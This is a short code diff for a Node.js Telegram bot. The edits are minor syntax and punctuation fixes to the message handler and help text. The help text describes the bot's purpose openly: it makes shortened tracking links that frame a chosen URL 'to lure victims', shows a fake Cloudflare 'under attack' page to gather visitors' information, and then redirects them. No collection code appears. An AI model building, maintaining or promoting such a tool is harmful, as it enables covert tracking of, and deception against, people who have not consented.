@@ -28,7 +28,7 @@ var use1pt = false;
 bot.on('message', async (msg) => {
     var chatId = msg.chat.id;
 
-    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
+    if (msg && msg.reply_to_message && msg.reply_to_message.text == "🌐 Enter Your URL") {
         createLink(chatId, msg.text);
     }
 
@@ -45,7 +45,7 @@ bot.on('message', async (msg) => {
     } else if (msg.text == "/create") {
         createNew(chatId);
     } else if (msg.text == "/help") {
-        bot.sendMessage(chatId, `Through this bot, you can track people by sending a simple link.\n\nSend /create to begin, afterward, it will ask you for a URL which will be used in an iframe to lure victims.\nAfter receiving the URL, it will send you some shortened links which you can use to track people.\n\nOnce a real user visits your trackable link, it will show a Cloudflare under attack page to gather information, and afterward, the victim will be redirected to the destination URL.`);
+        bot.sendMessage(chatId, `Through this bot, you can track people by sending a simple link.\n\nSend /create to begin; afterward, it will ask you for a URL which will be used in an iframe to lure victims.\nAfter receiving the URL, it will send you some shortened links which you can use to track people.\n\nOnce a real user visits your trackable link, it will show a Cloudflare under attack page to gather information, and afterward, the victim will be redirected to the destination URL.`);
     }
 });
 
